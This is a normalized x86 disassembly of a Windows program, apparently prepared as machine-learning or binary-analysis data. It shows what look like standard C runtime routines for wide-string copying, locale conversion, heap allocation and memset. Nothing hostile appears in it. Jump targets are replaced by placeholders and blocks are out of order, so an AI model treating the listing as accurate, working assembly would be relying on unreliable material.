je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_407fa1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_402dd3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_402d81
mov eax esi
sub_408016
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_402dd3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_402d81
mov eax esi
jmp r-xdata
sub_4080e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4080fe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_402dd3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_402dd3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_402d81
mov eax esi
sub_408161
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4081a0
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40929c
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_4081e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_405701
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_402dd3
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_408320
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40834b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4083d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40843a
push 0xc
push r--data
call sub_402ff0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_403035
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4084d0
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_4084d9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_408500
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_4023c2
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_402114
pop ecx
cmp eax ebx
je r-xdata
call sub_405750
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_4023c2
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_402114
pop ecx
cmp eax ebx
je r-xdata
call sub_405750
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_4086e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_408500
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40872d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_405780
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4023c2
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_402114
pop ecx
cmp eax ebx
je r-xdata
call sub_405750
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_408814
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40872d
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_408854
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_4020da
push [ esi + 0x8 ]
call sub_4020da
push [ esi + 0xc ]
call sub_4020da
push [ esi + 0x10 ]
call sub_4020da
push [ esi + 0x14 ]
call sub_4020da
push [ esi + 0x18 ]
call sub_4020da
push [ esi ]
call sub_4020da
push [ esi + 0x20 ]
call sub_4020da
push [ esi + 0x24 ]
call sub_4020da
push [ esi + 0x28 ]
call sub_4020da
push [ esi + 0x2c ]
call sub_4020da
push [ esi + 0x30 ]
call sub_4020da
push [ esi + 0x34 ]
call sub_4020da
push [ esi + 0x1c ]
call sub_4020da
push [ esi + 0x38 ]
call sub_4020da
push [ esi + 0x3c ]
call sub_4020da
add esp 0x40
push [ esi + 0x40 ]
call sub_4020da
push [ esi + 0x44 ]
call sub_4020da
push [ esi + 0x48 ]
call sub_4020da
push [ esi + 0x4c ]
call sub_4020da
push [ esi + 0x50 ]
call sub_4020da
push [ esi + 0x54 ]
call sub_4020da
push [ esi + 0x58 ]
call sub_4020da
push [ esi + 0x5c ]
call sub_4020da
push [ esi + 0x60 ]
call sub_4020da
push [ esi + 0x64 ]
call sub_4020da
push [ esi + 0x68 ]
call sub_4020da
push [ esi + 0x6c ]
call sub_4020da
push [ esi + 0x70 ]
call sub_4020da
push [ esi + 0x74 ]
call sub_4020da
push [ esi + 0x78 ]
call sub_4020da
push [ esi + 0x7c ]
call sub_4020da
add esp 0x40
push [ esi + 0x80 ]
call sub_4020da
push [ esi + 0x84 ]
call sub_4020da
push [ esi + 0x88 ]
call sub_4020da
push [ esi + 0x8c ]
call sub_4020da
push [ esi + 0x90 ]
call sub_4020da
push [ esi + 0x94 ]
call sub_4020da
push [ esi + 0x98 ]
call sub_4020da
push [ esi + 0x9c ]
call sub_4020da
push [ esi + 0xa0 ]
call sub_4020da
push [ esi + 0xa4 ]
call sub_4020da
push [ esi + 0xa8 ]
call sub_4020da
push [ esi + 0xbc ]
call sub_4020da
push [ esi + 0xc0 ]
call sub_4020da
push [ esi + 0xc4 ]
call sub_4020da
push [ esi + 0xc8 ]
call sub_4020da
push [ esi + 0xcc ]
call sub_4020da
add esp 0x40
push [ esi + 0xd0 ]
call sub_4020da
push [ esi + 0xb8 ]
call sub_4020da
push [ esi + 0xd8 ]
call sub_4020da
push [ esi + 0xdc ]
call sub_4020da
push [ esi + 0xe0 ]
call sub_4020da
push [ esi + 0xe4 ]
call sub_4020da
push [ esi + 0xe8 ]
call sub_4020da
push [ esi + 0xec ]
call sub_4020da
push [ esi + 0xd4 ]
call sub_4020da
push [ esi + 0xf0 ]
call sub_4020da
push [ esi + 0xf4 ]
call sub_4020da
push [ esi + 0xf8 ]
call sub_4020da
push [ esi + 0xfc ]
call sub_4020da
push [ esi + 0x100 ]
call sub_4020da
push [ esi + 0x104 ]
call sub_4020da
push [ esi + 0x108 ]
call sub_4020da
add esp 0x40
push [ esi + 0x10c ]
call sub_4020da
push [ esi + 0x110 ]
call sub_4020da
push [ esi + 0x114 ]
call sub_4020da
push [ esi + 0x118 ]
call sub_4020da
push [ esi + 0x11c ]
call sub_4020da
push [ esi + 0x120 ]
call sub_4020da
push [ esi + 0x124 ]
call sub_4020da
push [ esi + 0x128 ]
call sub_4020da
push [ esi + 0x12c ]
call sub_4020da
push [ esi + 0x130 ]
call sub_4020da
push [ esi + 0x134 ]
call sub_4020da
push [ esi + 0x138 ]
call sub_4020da
push [ esi + 0x13c ]
call sub_4020da
push [ esi + 0x140 ]
call sub_4020da
push [ esi + 0x144 ]
call sub_4020da
push [ esi + 0x148 ]
call sub_4020da
add esp 0x40
push [ esi + 0x14c ]
call sub_4020da
push [ esi + 0x150 ]
call sub_4020da
push [ esi + 0x154 ]
call sub_4020da
push [ esi + 0x158 ]
call sub_4020da
push [ esi + 0x15c ]
call sub_4020da
push [ esi + 0x160 ]
call sub_4020da
add esp 0x18
sub_408bcb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
push esi
call sub_4020da
pop ecx
sub_408c34
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4020da
pop ecx
push esi
call sub_4020da
pop ecx
sub_408d32
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_402dd3
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_403858
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_408db4
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_402114
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4020da
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_403858
pop ecx
call sub_402dd3
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_402dd3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_402d91
pop ecx
mov [ esi ] eax
push esi
call sub_403858
pop ecx
test eax eax
je r-xdata
call sub_402dd3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_402d91
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_408f80
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_408fb4
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40906e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_404051
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_409370
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_404051
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
push esi
call sub_404051
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_404051
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_404051
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_404051
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_404051
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_404051
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_404051
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_404051
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4077ef
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_404051
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_404051
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_402a93
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_4091f5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
